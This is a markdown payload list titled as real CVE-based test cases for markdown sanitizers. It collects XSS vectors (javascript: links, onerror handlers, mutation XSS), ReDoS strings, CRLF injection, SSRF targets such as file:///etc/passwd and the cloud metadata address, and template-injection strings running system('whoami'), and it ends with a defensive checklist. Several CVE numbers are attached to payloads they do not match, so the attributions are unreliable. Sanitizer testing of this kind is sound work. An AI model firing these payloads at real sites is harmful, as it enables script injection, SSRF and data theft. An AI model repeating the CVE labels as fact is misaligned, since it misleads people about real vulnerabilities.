# Real CVE-Based Markdown Security Test Cases

## CVE-2021-23382 - Marked XSS via Prototype Pollution
[__proto__](javascript:alert(1))
[constructor](javascript:alert(1))

## CVE-2021-39199 - Apostrophe Sanitize-HTML Bypass
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

## CVE-2020-7788 - Markdown-it XSS
![test](javascript&#58;alert(1))
[test](javascript&#x3a;alert(1))

## CVE-2022-21654 - Markdown XSS via Autolink
<javascript:alert(1)>
<JaVaScRiPt:alert(1)>

## CVE-2021-43138 - async library prototype pollution affects markdown
```javascript
{"__proto__":{"onerror":"alert(1)"}}
```

## CVE-2017-1000427 - Showdown XSS
[xss](javascript:alert`1`)
[xss](JaVaScRiPt:alert(1))

## CVE-2018-16468 - Loofah Gem XSS
<svg><style><img/src=x onerror=alert(1)></style></svg>

## CVE-2020-5321 - Django Markdown XSS
[link](javascript&colon;alert(1))
[link](jAvAsCrIpT:alert(1))

## CVE-2021-23425 - Trim-off-newlines ReDOS
\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n (repeat many times)

## CVE-2022-39201 - Commonmark GHSL-2022-043
]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]:]

## CVE-2019-5765 - Chrome Blink Renderer
<details open ontoggle="alert(1)">
<marquee onstart=alert(1)>

## CVE-2021-33502 - Normalize-URL Package
[test](https://evil.com\\@good.com)
[test](https://good.com#@evil.com)

## Markdown-it-sanitizer Bypasses
<form><button formaction=javascript:alert(1)>Click</button></form>
<input type="image" src=x formaction=javascript:alert(1)>

## showdown-xss-filter Bypass
[test](<javascript:alert(1)>)
[test]( javascript:alert(1))

## kramdown CVE-2020-14001
{::options parse_block_html="true" /}
<script>alert(1)</script>

## Redcarpet Bypass Patterns
[](javascript&#x3a;alert(1))
[](javascript&#58;alert(1))
[](javascript&#x003a;alert(1))

## Parsedown XSS Patterns
![a](b onerror=alert(1))
[a](b"onerror="alert(1))

## DOMPurify mXSS Bypasses (older versions)
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>

## Mutation XSS (mXSS) Patterns
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><style><img src=x onerror=alert(1)></style></svg>

## Unicode Normalization Attacks
[test](javascript\u003aalert(1))
[test](java\u0000script:alert(1))
[test](&#x6A;avascript:alert(1))

## CRLF Injection in Links
[test](http://example.com%0d%0aLocation:%20javascript:alert(1))
[test](http://example.com%0aSet-Cookie:malicious)

## Server-Side Request Forgery (SSRF) via Images
![test](file:///etc/passwd)
![test](http://169.254.169.254/latest/meta-data/)
![test](http://localhost:6379/)

## ReDoS (Regular Expression Denial of Service)
**Nested emphasis patterns:**
*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_

**Link reference spam:**
[a]: b
[a]: b
[a]: b
(repeat thousands of times)

## HTML Parser Confusion
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
<!--><script>alert(1)</script>-->
<![><script>alert(1)</script>]>

## Namespace Confusion
<math><mi xlink:href="javascript:alert(1)">click</mi></math>
<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>

## Content-Type Confusion
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">

## Template Injection via Markdown
{{constructor.constructor('alert(1)')()}}
${alert(1)}
<%= system('whoami') %>

## Advanced Obfuscation
[test](&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1))
[test](jav	ascript:alert(1)) // tab character
[test](java\nscript:alert(1))

## Testing Checklist:
1. All JavaScript should be blocked/escaped
2. All dangerous protocols should be filtered
3. HTML should be sanitized (whitelist approach)
4. No prototype pollution
5. No ReDoS vulnerabilities
6. No SSRF vectors
7. No template injection
8. Proper Unicode handling
9. No mutation XSS
10. No namespace confusion attacks
